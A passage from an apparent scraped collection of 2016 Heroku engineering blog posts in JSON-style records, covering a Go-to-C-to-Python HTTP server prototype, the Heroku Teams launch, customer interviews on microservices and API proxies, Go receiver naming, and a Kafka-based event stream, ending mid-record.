Request;\n\ntypedef unsigned int ResponseWriterPtr;\n\ntypedef void FuncPtr(ResponseWriterPtr w, Request *r);\n\nextern void Call_HandleFunc(ResponseWriterPtr w, Request *r, FuncPtr *fn);\n*/\nimport \"C\"\nimport (\n    \"net/http\"\n    \"unsafe\"\n)\n\nvar cpointers = PtrProxy()\n\n//export ListenAndServe\nfunc ListenAndServe(caddr *C.char) {\n    addr := C.GoString(caddr)\n    http.ListenAndServe(addr, nil)\n}\n\n//export HandleFunc\nfunc HandleFunc(cpattern *C.char, cfn *C.FuncPtr) {\n    pattern := C.GoString(cpattern)\n    http.HandleFunc(pattern, func(w http.ResponseWriter, req *http.Request) {\n        // Wrap relevant request fields in a C-friendly datastructure.\n        creq := C.Request{\n            Method: C.CString(req.Method),\n            Host:   C.CString(req.Host),\n            URL:    C.CString(req.URL.String()),\n        }\n        // Convert the ResponseWriter interface instance to an opaque C integer\n        // that we can safely pass along.\n        wPtr := cpointers.Ref(unsafe.Pointer(&w))\n        // Call our C function pointer using our C shim.\n        C.Call_HandleFunc(C.ResponseWriterPtr(wPtr), &creq, cfn)\n        // Release the ResponseWriter from the registry since we're done with\n        // this response.\n        cpointers.Free(wPtr)\n    })\n}\n\nfunc main() {} Let's break it down. We're exporting two functions into the C API: ListenAndServe which is used to start our server. HandleFunc which is used to register a callback handler for some route \npattern. Note that the exported functions all take in C.* types, because they'll be called from the C side of things. There is a tricky bit here: The HandleFunc callback function pointer accepts two parameters: http.ResponseWriter and *http.Request . This isn't going to fly for two reasons. The first parameter is a Go interface and both C and Python have no idea what those are. The second parameter is a pointer to an instance which we can't share across the runtime boundary, because that's a big no-no (see the Considerations section). For the *http.Request data structure, we make a C equivalent ( typedef struct Request_ { ... } ), populate it by copying the necessary values, and pass it forward instead. For the http.ResponseWriter interface, we work around it by creating additional exported shims in Go. These shims call the interface's function in Go on behalf of C (more on that in a moment). There is one more weird trick here: We need to pass some kind of reference to whichever interface instance we're talking about, get that back, and call the original interface without passing any memory pointers across the runtime. How do we do that safely? With our own pointer registry! There are three operations we care about, each one is just a couple of lines that saves a key in a lookup and the reverse. type ptrProxy struct {\n    sync.Mutex\n    count  uint\n    lookup map[uint]unsafe.Pointer\n}\n\n// Ref registers the given pointer and returns a corresponding id that can be\n// used to retrieve it later.\nfunc (p *ptrProxy) Ref(ptr unsafe.Pointer) C.uint { ... }\n\n// Deref takes an id and returns the corresponding pointer if it exists.\nfunc (p *ptrProxy) Deref(id C.uint) (unsafe.Pointer, bool) { ... }\n\n// Free releases a registered pointer by its id.\nfunc (p *ptrProxy) Free(id C.uint) { ... } Now rather than passing in the entire http.ResponseWriter interface instance, we can register it in our pointer registry and pass along the id which will later come back to us. This is nice and safe because nothing outside of the Go runtime can modify the original memory space, all it can do is hang onto some opaque integer and hand it back later. Let's take a quick look at our interface shims: // C interface shim for ResponseWriter.Write([]byte) (int, error)\n//export ResponseWriter_Write\nfunc ResponseWriter_Write(wPtr C.uint, cbuf *C.char, length C.int) C.int {\n    buf := C.GoBytes(unsafe.Pointer(cbuf), length)\n\n    w, ok := cpointers.Deref(wPtr)\n    if !ok {\n        return C.EOF\n    }\n\n    n, err := (*(*http.ResponseWriter)(w)).Write(buf)\n    if err != nil {\n        return C.EOF\n    }\n    return C.int(n)\n}\n\n// C interface shim for ResponseWriter.WriteHeader(int)\n//export ResponseWriter_WriteHeader\nfunc ResponseWriter_WriteHeader(wPtr C.uint, header C.int) {\n    w, ok := cpointers.Deref(wPtr)\n    if !ok {\n        return\n    }\n    (*(*http.ResponseWriter)(w)).WriteHeader(int(header))\n} Now, given our proxied pointer ID in C, we'll be able to call Write and WriteHeader on the underlying ResponseWriter that continues to live in Go. We could expand this to cover the full interface but, for the sake of our prototype, these two will do. The Python Let's skip the CFFI boilerplate we've seen before and dive right into our C-to-Python wrapper: import os\nfrom ._gohttplib import ffi\n\nlib = ffi.dlopen(os.path.join(os.path.dirname(__file__), \"libgohttp.so\"))\n\n\nclass ResponseWriter:\n    def __init__(self, w):\n        self._w = w\n\n    def write(self, body):\n        n = lib.ResponseWriter_Write(self._w, body, len(body))\n        if n != len(body):\n            raise IOError(\"Failed to write to ResponseWriter.\")\n\n    def set_status(self, code):\n        lib.ResponseWriter_WriteHeader(self._w, code)\n\n\nclass Request:\n    def __init__(self, req):\n        self._req = req\n\n    @property\n    def method(self):\n        return ffi.string(self._req.Method)\n\n    @property\n    def host(self):\n        return ffi.string(self._req.Host)\n\n    @property\n    def url(self):\n        return ffi.string(self._req.URL)\n\n    def __repr__(self):\n        return \"{self.method} {self.url}\".format(self=self)\n\n\ndef route(pattern, fn=None):\n    \"\"\"\n    Can be used as a decorator.\n\n    :param pattern:\n        Address pattern to match against.\n\n    :param fn:\n        Handler to call when pattern is matched. Handler is given a\n        ResponseWriter and Request object.\n    \"\"\"\n    def wrapped(fn):\n        @ffi.callback(\"void(ResponseWriter*, Request*)\")\n        def handler(w, req):\n            fn(ResponseWriter(w), Request(req))\n\n        lib.HandleFunc(pattern, handler)\n\n    if fn:\n        return wrapped(fn)\n\n    return wrapped\n\n\ndef run(host='127.0.0.1', port=5000):\n    bind = '{}:{}'.format(host or '', port)\n    print(\" * Running on http://{}/\".format(bind))\n    lib.ListenAndServe(bind) Just like we made C-friendly wrappers around Go's ResponseWriter and Request , here we're making Python-friendly wrappers around C's Request_ struct and ResponseWriter_* interface shims we made. All of this is just to hide CFFI's warts and make the exposed API somewhat idiomatic. The final trick is converting our Python callback handler function into a C function pointer that can be passed back to Go. Luckily, CFFI has a convenient @ffi.callback(...) decorator which does all the nasty work for us. Off to the races we go! lolbenchmarks It's fun to take a look at the performance characteristics of this kind of approach. Yes, yes, of course, this isn't Production Ready or anything, but for the sake of some laughs: Conditions: ab doing 10,000 requests with 10 concurrency on my 💻. If you want to see how it stands up on Heroku dynos, just hit the deploy button and see how it works for you: These are all basic \"Hello, world\\n\" handlers. The first one is straight-up Go, then it's Go-to-C, then it's Go-to-C-to-Python (gohttp-python). It does pretty well. Keep in mind that this is with 10 concurrent requests, so werkzeug-flask probably chokes more on the concurrency than the response time being slow. Name Total Req/Sec Time/Req go-net/http 1.115 8969.89 0.111 gohttp-c 1.181 8470.97 0.118 gohttp-python 1.285 7779.87 0.129 gunicorn-flask 7.826 1277.73 0.783 werkzeug-flask 15.029 665.37 1.503 Again, this is for-fun off-the-cuff unscientific lolbenchmarks. What's left? We've discussed 80% of what's involved, but the remaining 80% is still available as an exercise for the reader (or maybe a future blog post): The gohttp Python dependency comes pre-published to PyPI for your convenience, but you'll need build and distribute the dependency yourself if you want to tweak it further. Play whack-a-mole with memory leaks. The current prototype is not safe or battle-tested by any means. Any time a C variable gets declared, we'll need to free it. Implement the rest of the interfaces that we need. Right now there are only a couple of functions available but there is much more to build a full server. Pull requests welcome ! Handy links https://shazow.net/ is where you can see more fun experiments by me, and @shazow is me on Twitter. https://github.com/shazow/gohttplib/ is the source code for this project. More posts on this topic: https://blog.filippo.io/building-python-modules-with-go-1-5/ https://feiskyer.github.io/2016/04/19/cgo-in-go-1-6/ Automagic code generating: https://github.com/sbinet/go-python https://github.com/go-python/gopy python go c cffi interop webserver python performance", "date": "2016-06-02,"},
{"website": "Heroku", "title": "Introducing Heroku Teams", "author": ["Ike DeLorenzo"], "link": "https://blog.heroku.com/heroku-teams", "abstract": "Introducing Heroku Teams Posted by Ike DeLorenzo June 09, 2016 Listen to this article For many of us, building apps is a team sport.  With any team, getting all the people, processes and tools in sync and working together can be a challenge, and this is especially true with software development. Today we are announcing a new feature designed to help to make building and running effective software teams easier.  Available for free (for up to five users), Heroku Teams lets groups of software developers manage different projects, permissions, and people in a unified console with centralized administration and billing.  Teams is available today for all users, and is accessible via our newly enhanced dashboard. Creating Your First Team With the introduction of Teams, the first change you will notice is that there is a new way to group your applications and switch between Teams.  (If you are a Heroku Enterprise customer, your Enterprise Organizations will be accessible via this menu as well.) In this new drop down, in addition to your Personal Apps, you will see an option to create new a Team;  just select \"Create a Team …\", then provide a Team name and validate with a credit card.  The Heroku resources your Team owns will be charged to this card — allowing you flexibility in managing per-team billing.  Personal apps can easily be transferred to a Team, and any Team admin can create and configure new Team resources. As Team admin, you can invite others to join your Team whether or not they already have a Heroku account, and optionally choose to delegate administration over permissions, resource management, and billing. Heroku will e-mail and on-board your team members. The new Heroku web interface presents all the Teams to which you have access in a simple context switcher that appears at the top of all app lists. Heroku Flow for Teams Teams get even better when they are combined with our other collaboration features like Heroku Pipelines, Review apps, and GitHub deploys. A single Heroku Pipeline can structure your team's development, staging, and production apps to automatically provide for members to collaborate on continuous delivery.  All members can spin-up Review apps on Pull Requests, accomplish deployments, and promote builds between stages. Admins can “lock” sensitive production apps to prevent deployments.  And, you can even invite non-Team members to have access that is restricted to apps in one or more stages of the Pipeline (for example, Staging apps only). Teams members can be granted administrative permissions to manage app Add-ons across every stage in a Pipeline, and control billing for the entire Pipeline of apps. Pricing and Use Every Heroku user can create up to five teams.  All teams are free for up to five members, and larger teams are just $10/month.  Each Team can have up to 25 members. For larger Teams with additional governance, compliance, and authentication needs, there's seamless transition for any Team to a new or existing Heroku Enterprise instance. And more information You can learn more about Heroku Teams on the Heroku Dev Center , and we'd appreciate your feedback on the feature at heroku-teams-feedback@heroku.com .", "date": "2016-06-09,"},
{"website": "Heroku", "title": "How Belly Scales Using API Proxies with their Microservices Architecture: Interview with Darby Frey", "author": ["Chris Castle"], "link": "https://blog.heroku.com/how-belly-scales-using-api-proxies-with-their-microservices-architecture", "abstract": "How Belly Scales Using API Proxies with their Microservices Architecture: Interview with Darby Frey Posted by Chris Castle June 23, 2016 Listen to this article Darby Frey is Director of Platform Engineering at Belly, the leading loyalty marketing platform in the U.S. For more information, visit www.bellycard.com or read our Belly customer story to learn more about how Heroku has helped Belly scale their business. How did you approach migrating to a microservices architecture? Originally, we built the entire business on one Rails app. Then a couple years ago, we pivoted to a microservices approach. It is still a work in progress, but we’re migrating components of the monolithic app whenever it makes sense. For example, when we need to add or expand a feature, or if we need to scale something independently, then it makes sense to pull that out into a microservice. We don’t have a grand plan to break everything out and re-write it all at once. So far, this approach is working pretty well for us. The ability to independently scale components has been really helpful. When we see spikes, we can address them individually and they’re no longer such a big deal. We’re also happy with how well the microservices approach fits with the Heroku platform. We currently have over 100 apps running on Heroku. How do you standardize across your 100+ apps? We’ve done a good job at standardizing. We made our own small Ruby framework for our microservices that we call “Napa.” It’s basically a stripped down version of Rails. It gives us a low memory footprint, which works great on Heroku because we can run a lot of our apps on 1x or 2x dynos and not overtax them in terms of memory. Everything is standard, so any engineer can jump across services and see the same structure. How do you handle requests between your front end apps and microservices? We had started building front end apps on top of our backend microservice architecture. All our apps are either native mobile apps or single page web apps built in AngularJS. These apps would get deployed to S3 and they would connect to our backend, but we didn’t want them to connect to the microservices directly. We wanted to put a layer of security between the public Internet and our microservices, so we decided to build an API proxy. How did you get started using API proxies? Our first approach was to build a Rails app to act as a proxy between our single page web apps and our backend microservices. We’d direct traffic to the Rails app which would do some security checks, and then proxy the request to a backend service. It kind of worked; we had a layer of security in between that allowed us to control access but it was slow and difficult to build some of the complex interactions we were needing. How did you solve these problems? We started looking at external tools for API management, such as 3scale, Mashery, and Apigee. We ended up going with Apigee, which offers a nice customizable tool called “Edge.” It’s an environment where we can build a proxy layer that sits on top of our app stack. Unlike our Ruby proxy service, Apigee Edge does a better job at taking a response and transforming it before sending it to the client. We can make parallel requests from Apigee to our backend services, take all those responses, mash them up, and create appropriate response payloads for the consumer. We define the mashup logic in JavaScript, and Apigee also allows us to share it across proxies, so in many cases we can DRY up our code at that level. We use that feature quite a bit. So now, the way we think about it is we’re not building one API to serve all our clients. We actually build custom API interfaces for each consumer: Android, iOS, iPad, external partners, etc. We can optimize the response for each client at the Apigee layer - without affecting our backend services. Because this allows us to be so flexible, we are able to move faster and create more optimized interfaces for each consumer. How do you handle versioning of your microservices and proxies? We still have to deal with versioning our microservices on our platform side. Our approach is to make additive changes that maintain backwards support. If we have to make a significant change to an API, we’ll just version it. Version 1 will continue to do what it needs to do, and version 2 will be for new features. The Apigee clients can be configured to use one or the other. In the future, we’ll have to do a major overhaul of this, but for now it works well for us. Apigee also allows us to add some basic logging to our proxies, which we send to Loggly. We use it to tell us which Apigee proxies are calling which microservices. So, if we have to make a significant change to an endpoint, then we’ll be able to use the logs to determine the impact on the Apigee side. This has worked well for us so far. How do you deploy your proxies? To run on Apigee, we build our proxies using their XML specification. We do our mashup logic using a simple JavaScript environment they provide. We maintain a GitHub repo for all our Apigee proxies and use the same pull request model that we use for all our code. From there we use a CLI tool that sends an API request to Apigee to deploy the code. We have about 70-80 proxies now, and each one is very specific with 4 or 5 endpoints each. We can deploy each one independently, so we don’t have to deploy the whole thing each time. This means we don’t run the risk of breaking our entire API proxy setup if a single proxy has a syntax error. Apigee also does a compile before deploying, so if it fails for some reason it won’t go into production. That gives us an extra sanity check. How many microservices does a client typically interact with on each request? Good question. The most we’ll see for one request may be 8 or 9 calls, but on average it’s probably more like 2 to 4 calls. We try to avoid crazy segmentation in our microservices. The trend seems to be when companies decide to do microservices, they just explode out and build way too many microservices for them to manage. Then, over time, they will pull some of the more granular ones together into more consolidated services when they start to feel the pain. We’ve gone that route as well. For us, the pain comes in when some common dependency is affected by a security CVE, and we have to then patch and deploy 50 apps—it’s a real headache and takes some of the team out of development for a couple of days to get it done. Has taking this proxy approach changed the way you think about an API? Definitely. Our proxy APIs are more like views into our backend. We don’t want to have a ton of logic in there, but we can have a little bit. The real business logic happens at the service layer. We will do things like field mapping or structuring responses at the proxy layer. What advice would you give others on how to size microservices? I tell people - try to think of a component that you can break off that would have little to no interaction with your primary app - usually you can see this by looking at what data models are used for a given feature. That’s the starting point. Once you’ve broken out one service, it starts to become easier to see where the seams are in your application, and you can start to carve out those services as well. If you have common joins across components, then it makes more sense to keep them in the same service. For example, we have a businesses table and a users table and we’re always joining across those, so it doesn’t make sense to keep them separate. There’s not enough complexity in each individually for them to live on their own.", "date": "2016-06-23,"},
{"website": "Heroku", "title": "How Emarsys Approaches Service Sizing on Heroku", "author": ["Chris Castle"], "link": "https://blog.heroku.com/emarsys-service-sizing", "abstract": "How Emarsys Approaches Service Sizing on Heroku Posted by Chris Castle July 07, 2016 Listen to this article Based in Budapest, Hungary, Andras Fincza (Head of Engineering) and Rafael Ördög (Technical Lead) work for Emarsys , a global marketing automation platform. Read our Emarsys customer story to learn more about their migration experience on Heroku. How did you introduce microservices at Emarsys? We take an evolutionary approach to our architecture. Our marketing automation platform was originally designed as a monolithic system built in PHP and MySQL and running on in-house infrastructure. We were running two major services on our in-house infrastructure: one for HDS (historical data service) and the other for smart insights and analysis. However, it was hard to grow the platform effectively because it required heavy support from our system engineering resources. Our system engineers were regularly inundated with requests, and it took a while to make any changes. In late 2014, we started experimenting with a service-oriented architecture to ease the burden on system engineering and allow us to experiment with new technologies. We wanted the ability to deploy and scale some features independently. We also wanted to try different languages and data stores without adding an extra burden on our system engineering team. We decided to pilot a small, non-critical microservice which would funnel user behavior data into our main application. We considered several options, but in the end we chose to run our pilot on Heroku. We were able to run it successfully without system engineering support, and our management agreed to let us go further in the direction of a service-oriented architecture. We moved more non-critical services to the cloud, and now we are running more and more critical services on Heroku. Based on our experience, we established a goal of having only “no ops teams” in the future.  These teams would be able to develop and manage individual services themselves, without having to rely on system engineering. Running our apps on Heroku has both eased the burden on system engineering as well as allowed us to more effectively plan and control costs. Do you still develop on the legacy app? We still maintain the legacy app and add new things on occasion. It’s hard to split off some large feature sets from the monolithic app, and we find that the legacy infrastructure is better suited to some services. But most of our teams are now developing on Heroku. As we are planning new features, we’ll create them as feature services on Heroku whenever possible. We currently have 150+ services on Heroku with 42 services in production. With the current trend toward microservices, how do you approach service sizing? We call our services “feature services” rather than “microservices” because they have a broader scope and context than a typical microservice. Each is essentially a full stack service with an independent front and back end. For example, user management is not just about managing users, but also about managing invitation emails, lost passwords, etc. We took this approach because we were afraid that if we had hundreds or even thousands of microservices, they’d be extremely difficult to manage. So the broader scope of “feature services” works much better for us. However, it’s not only about the amount of services we moved to the cloud, but also about the architecture of specific services as well. When setting up our services, we keep in mind that they might have to be split up if they get too big. For example, we currently have a service that provides reporting UIs, but it is also responsible for storing data. If the data gets too big, we can split it off to our data warehouse and maintain a very lightweight service for serving data and a separate service that is only for providing the UI as a real backend for the front end. When we saw that it was not so good to have big service call chains, we started to cache and use internal data stores to provide very fast experiences for users. How do you handle security and communication between services? Our services communicate mostly through REST APIs, but some also use RabbitMQ message queues. To keep service chains very short, we want only some services to respond to requests. Within our legacy app, we open an iFrame or use Javascript to bring in the feature service to create a seamless single-page app UX. Security is critical for us. In order to ensure security between services, we developed a stateless HTTP request signing library called Escher , which is a version of the authentication library from AWS Signature Version 4, to sign every request between services. What else can you tell us about your stack? We are early adopters of many things. Our organization has a rule: as long as your team can build it, troubleshoot it, and operate it without system engineering resources, then our management is willing to let you run a pilot project. Heroku has enabled us to experiment more freely. Since our services are full stack, we can use whatever language we think is best. We’ve been using a lot of Javascript and Node.js , along with MongoDB , Heroku Redis , Heroku Postgres , and SQL. We’d been using AngularJS since 1.1 and now we’re testing Angular 2 beta. From our first experiments on Heroku, we’ve pioneered many new technologies for Emarsys. In addition, many engineers outside of our company are also interested in learning more about our experience with technologies such as Angular 2. As part of the JSConf Budapest in May 2016, Andras Fincza and colleagues ran a sold-out workshop entitled: “ A Journey Towards Angular 2 .” Due to popular demand, the workshop will be repeated soon. microservices feature services emarsys node angular php escher", "date": "2016-07-07,"},
{"website": "Heroku", "title": "Neither self nor this: Receivers in Go", "author": ["Andrey Petrov"], "link": "https://blog.heroku.com/neither-self-nor-this-receivers-in-go", "abstract": "Neither self nor this: Receivers in Go Posted by Andrey Petrov July 13, 2016 Listen to this article Andrey Petrov is the author of urllib3 , the creator of Briefmetrics and ssh-chat , and a former Googler and Y Combinator alum. He’s back again to free us of our old ways of thinking, so that we can embrace what's really special about receivers in Go. When getting started with Go, there is a strong temptation to bring baggage from\nyour previous language. It’s a heuristic which is usually helpful, but sometimes\ncounter-productive and inevitably results in regret. Go does not have classes and objects, but it does have types that we can make\nmany instances of. Further, we can attach methods to these types and they\nkind-of start looking like the classes we’re used to. When we attach a method\nto a type, the receiver is the instance of the type for which it was called. Choosing the name of a receiver is not always a trivial task. Should we be lazy \nand name them all the same (like this or self )? Or treat them not unlike \nlocal variables by abbreviating the type (like srv to a Server type )? Or \nmaybe something even more nuanced? And what are the consequences? How will our code suffer if we choose one \napproach over the other? Let's explore. Quick refresher on Go structs type Server struct {\n    ...\n}\n\nfunc (srv *Server) Close() error {\n    ...\n}\n\nfunc (srv Server) Name() string {\n    ...\n} Every time I start writing somekind of server, it starts out looking like this. It's a type that holds information about our server, like a net.Listener socket, and it has a Close() method that shuts down the server. Easy enough. The receiver of the Close() method is the (srv *Server) part. This says \nthat inside of the Close() method declaration, the scope will have a srv variable that is a reference to the instance of the Server that it's being \ncalled on.  That is: myServer := &Server{}\nmyServer.Close() In this case, the srv that is referenced inside of the myServer.Close() is \neffectively the same variable as myServer . They're both references to the same Server instance. Facts about Go methods and receivers While we can call a method on a type instance and get the receiver implicitly, \nit can also be called explicitly: myServer := Server{}\nServer.Name(myServer) // same as myServer.Name()\n(*Server).Close(&myServer) // same as myServer.Close() These functions can be passed around as references just like any other function, \nwith the implicit receiver or without: withReceiver := myServer.Name\nwithout := Server.Name Receivers can be passed by reference or passed by value. func (byValue Server) Hello() { ... }\nfunc (byReference *Server) Bye() { ... } This is to illustrate that struct methods in Go are merely thin sugar over \ntraditional C-style struct helper declarations. An equivalent C method might \nlook like this: void server_close(server *srv) { ... } Go helps by namespacing the methods and implicitly passing the receiver when \ncalled on an instance, but otherwise there is very little magic going on. In other languages where this and self is a thing (Python, Ruby, JavaScript, \nand so on) it's a much more complicated situation. These are not vanilla local \nvariables wearing fancy pants. The thing we might expect this to represent \ninside of a method could actually represent something very different once \ninheritance or metaclasses had their way. In effect, it might not make any sense \nto give contextual names like srv rather than self in Python, but it \ndefinitely makes sense in Go. Naming the receiver As we write idiomatic Go code, it's common to use the first letter or a short \nabbreviation as the name of the receiver. If the name of the struct is Server , we'll usually see s or srv or even server . All of these are fine—short is convenient, but it's more about uniquely identifying the variable in a consistent way. But why not self or this ? Coming from languages like Python, or Ruby, or JavaScript, it's \ntempting to do something like: func (this *Server) Close() error {\n    ...\n} That's one less decision to make every time we declare a struct. All of our \nmethods could use the same receiver. Any time we see this in the code, we'll know that we're talking about the receiver, not some random local variable. It \nwill be GREAT!.. or will it? What if we refactor the code and this is no longer referring to the same thing \nas before? And are we giving up valuable semantic meaning? Reshaping our code Eventually we'll need to refactor some of our code: Take a chunk of code that is \nalready functional and put it in another context where it allows for more \nflexibility towards a higher-level goal. For example, consider moving pieces of code between levels abstractions or \nfrom higher levels of abstraction into a lower level. Imagine taking this \nsnippet from a higher-level container like Room which holds groups of users in \na server, and moving it up or down one level: func (this *Room) Announce() {\n    srv := this.Server()\n    for _, c := range srv.Clients() {\n        // Send announcement to all clients about a new room\n        c.Send(srv.RenderAnnouncement(this))\n    }\n}\n\n// Moved between...\n\nfunc (this *Server) AddRoom(room *Room) {\n    for _, c := range this.Clients() {\n        // Send announcement to all clients about a new room\n        c.Send(this.RenderAnnouncement(room))\n    }\n} When using this , there is confusion about whether we're referring to the \nserver or the room as we're moving the code between. -       c.Send(this.RenderAnnouncement(room))\n+       c.Send(srv.RenderAnnouncement(this)) Refactoring this kind of code produce some bugs that the compiler will hopefully \ncatch (or maybe not, if the interfaces happen to be compatible). Even bugs \naside, having to edit all the little innards does make moving code around more \ntedious. Moving across levels of abstraction is a great example of when consistently \nwell-named receivers make a huge difference: func (room *Room) Announce() {\n    srv := room.Server()\n    for _, c := range srv.Clients() {\n        // Send announcement to all clients about a new room\n        c.Send(srv.RenderAnnouncement(room))\n    }\n}\n\n// Moved between...\n\nfunc (srv *Server) AddRoom(room *Room) {\n    for _, c := range srv.Clients() {\n        // Send announcement to all clients about a new room\n        c.Send(srv.RenderAnnouncement(room))\n    }\n} This is a great little pattern to keep everything working despite moving between \nlayers of abstraction. Note how the inner code stays identical and all we're \ndoing is sometimes adding a little extra context outside of it. As projects mature, this kind of refactoring happens surprisingly often. We're \ntalking about just one line in this example, but the same applies for larger \nchunks too. The suggested strategy for naming Go receivers is the same strategy for naming \nnormal local variables. If they're named similarly, then these code blocks can \nbe moved wholesale between layers of abstraction with minimal hassle and helps \nus avoid careless bugs. By naming receivers as this or self , we're actually making receivers special in a way that is counter-productive. Imagine naming every local \nvariable with the same name, all the time, regardless of what it represents? A \nscary thought. Advanced naming technique If we agree that contextually named receivers are meaningful, then maybe we can \nutilize this opportunity for an even greater advantage. What if we named our receivers based on the interface that they're implementing \n(if any)? Let's say we add io.Writer and io.Reader interfaces to our Server: func (w *Server) Write(p []byte) (n int, err error) {\n    // Send p to all clients\n}\n\nfunc (r *Server) Read(p []byte) (n int, err error) {\n    // Receive data from all clients\n} Maybe we also want to add the http.Handler interface to provide a dashboard \nfor our server. func (handler *Server) ServeHTTP(w http.ResponseWriter, r *http.Request) {\n    // Render dashboard\n} There are a few benefits to doing it this way: The receivers enhance the self-documenting nature of our code. It becomes \nclearer which interface each method is attempting to implement. If we were implementing these wrappers outside of the Server struct, we \nwould likely be using similarly named variables for intermediate code. By \nnaming the receiver in a corresponding way, it makes it easier to move the \ncode inline without changing much. As we add interface-specific functionality, it's likely that we'll need to add \nmore fields to our struct to manage various related state. The code can look \nmore meaningful when a read buffer is being accessed from a r receiver to \nimply that its purpose is specifically for this functionality rather than it \nbeing a more general buffer for the server as a whole. Name of the Receiver Carefully naming our receivers can have lots of tangible benefits, especially as \nour project grows and code gets moved around. It can make our inner method code \nmuch more readable without needing to be aware of which struct it's embedded \ninto. It can even add an opportunity to indicate higher-level layout of our \nstruct's interface implementation. Picking a fixed name for all receivers like self can have negative effects \nlike mixing up context when code gets moved around. It removes a decision during \nwriting, but the cost creeps up when we go back to read the code or refactor it. Go forth and give your receivers the names they deserve. go receivers this self methods", "date": "2016-07-13,"},
{"website": "Heroku", "title": "Powering the Heroku Platform API: A Distributed Systems Approach Using Streams and Apache Kafka ", "author": ["Scott Persinger"], "link": "https://blog.heroku.com/powering-the-heroku-platform-api-a-distributed-systems-approach-using-streams-and-apache-kafka", "abstract": "Powering the Heroku Platform API: A Distributed Systems Approach Using Streams and Apache Kafka Posted by Scott Persinger July 19, 2016 Listen to this article We recently launched Apache Kafka on Heroku into beta. Just like we do with Heroku Postgres, our internal engineering teams have been using our Kafka service to power a number of our internal systems. The Big Idea The Heroku platform comprises a large number of independent services. Traditionally we’ve used HTTP calls to communicate between these services. While this approach is simple to implement and easy to reason about, it has a number of drawbacks. Synchronous calls mean that the top-level request time will be gated by the slowest backend component. Also, internal API calls create tight point-to-point couplings between services that can become very brittle over time. Asynchronous messaging has been around a long time as an alternative architecture for communicating between services. Instead of using RPC-style calls between systems, we introduce a message bus into our system. Now to communicate between system A and B, we can simply have system A publish messages to the message bus, and system B can consume those messages whenever it wants. The message bus stores messages for a certain period of time, so communication can occur between system A and system B even if both aren’t online at the same time. Increasingly we are moving from our synchronous integration pattern to the asynchronous messaging integration pattern, powered by Kafka. This creates much looser coupling between our services. This allows our services and (importantly!) our development teams to operate and to iterate more independently. The message stream produced by system A creates an abstract contract - as long as system A continues to publish a compatible stream of messages, then both systems A and B can be modified without regard to the other. Even better, the producing system doesn’t need to know anything about the consuming system(s). We can add or remove consumers at any time. Compared to traditional message brokers, Kafka offers a number of benefits. It offers blazing performance and scalability, with the ability to handle hundreds of thousands of messages per second. Its architecture supports relatively long-term message storage, enabling consumers to read back in time many hours. And its simple log-oriented design provides good delivery guarantees without requiring any complex ack/nack protocol. Finally, its multi-node architecture offers zero downtime (brokers within a cluster can be upgraded independently) and simple horizontal scalability. This makes Kafka suitable for a large range of integration and stream processing use cases, all running against the same Kafka cluster. The Platform Event Stream Our core internal service generates an abstract event stream representing all resource changes on the platform - we call this the platform event stream. We’ve built a number of variations of this stream, once on Postgres, once with AWS Kinesis, and our latest version uses the Kafka service. As a globally shared service, Kinesis throttles read bandwidth from any single stream. This sounds reasonable, but in practice means that adding additional consumers to a stream slows down all consumers of that stream. This resulted in a situation where we were reluctant to add additional consumers to the platform event stream. This encouraged us to re-implement the stream on Kafka. We have been very happy with the minimal resources required to serve additional consumers - a single Kafka cluster can easily serve hundreds of clients. When we launched the Kafka version of the platform event stream, we wanted to ease the transition for the clients of our existing Kinesis stream. These clients expected an HTTP-based interface and a managed authentication system. We had expansive plans to allow lots of different clients, and we wanted both to simplify the process of creating new clients as well as be able to control stream access at a fine-grained level. So we decided to implement a simple proxy to front our Kafka cluster. The proxy uses HTTP POST for publishing and a Websocket channel for consuming. It also implements a custom client authentication scheme. The proxy offers a layer of manageability on top of our Kafka cluster which allows us to support a large set of client use cases. It also allows us to protect our Kafka cluster inside a secure Heroku Private Space while still allowing controlled access from outside the Space. The proxy exacts a performance penalty relative to the native Kafka protocol, but we’ve found that Kafka is so fast that this penalty is acceptable for our requirements. Some other teams at Heroku with “bare metal” performance needs are using their own Kafka clusters with native clients. Despite the trade-offs, we have been very happy with the results. We have more than ten different consumers of the platform event stream, and the minimal onramp costs for connecting to the proxy (requiring nothing more than a websocket client) are enabling that number to grow steadily. Kafka’s robust scalability means that adding another consumer of the event stream costs almost nothing in additional resources, and this had led us to creating new consumers for lots of purposes that we never originally envisioned. Generalizing the architecture The success of Kafka plus the websocket proxy has encouraged us to generalize the proxy to support additional event streams beyond our original one. We have now opened up the proxy so that other teams can register new Kafka topics hosted within our cluster. This gives them the kind of zero-administration service they expect with low cost and high scalability. Some features that we would like to support in the future include: A schema registry to hold definitions for all events, both for discoverability and potentially message validation Message filtering Public consumers. Eventually we hope to expose the event stream as a primitive to all clients of the Heroku platform API. Confluent has some interesting open source offerings in these areas, including their own REST Proxy for Kafka and their Schema Registry for Kafka . A Path to a New Architecture This asynchronous integration pattern aligns well with the broader architectural shift away from batch processing with relational databases towards real-time stream processing. Rethinking your services as event-driven stream processors offers a path towards a much more agile, scalable, and real-time system but requires thinking very differently about your systems and the tools you are using. Kafka can play a key role in enabling this new style of real-time architecture, and techniques like using an HTTP proxy are effective tools for easing experimentation and adoption. Moving to a real-time, asynchronous architecture does require significant new ways of thinking.\nPush channels must be created to notify users of system state asynchronously, rather than simply relying on the HTTP request/response cycle. Rethinking the notion of “persistent state” as a “point in time snapshot” rather than “canonical source of truth” implies a very different application architecture than the ones to which most engineers are accustomed. Architecting for eventual consistency and compensating transactions requires developing new techniques, libraries, and tools. kafka Private Spaces", "date": "2016-07-19,"},
{"website": "Heroku", "title": "How Combatant Gentlemen Solved Service Discovery Using Heroku Private Spaces", "author": ["Chris Castle"], "link": "https://blog.heroku.com/combatant-gentlemen-service-discovery", "abstract": "How Combatant Gentlemen Solved Service Discovery Using Heroku Private Spaces Posted by Chris Castle July 21, 2016 Listen to this article Scott Raio is Co-Founder and CTO of Combatant Gentlemen , a design-to-delivery menswear e-commerce brand. Read our Combatant Gentlemen customer story to learn more about how Heroku helped them build a successful online business. What microservices are you running in Heroku Private Spaces? We’ve written an individual service for every business use case. For example, we have services for order processing, product catalog, account management, authentication, swatch display, POs, logistics, payments, etc. With all these different services, we chose Heroku Private Spaces as a way to make service discovery easier. We’re currently running about 25 services, which is a relatively small number compared to Netflix or Twitter (who employ hundreds of services). But we’re growing, and we’re always evaluating our services to determine which ones are too large and need to be broken out. Most of our services work autonomously and share nothing between them. When the services are isolated and containerized, then changes are much simpler. It’s a very clean approach. What languages did you use to write your microservices? Most of our services are written in Ruby , due to the language’s development speed and flexibility. We leverage Grape , a Ruby framework for creating REST-like 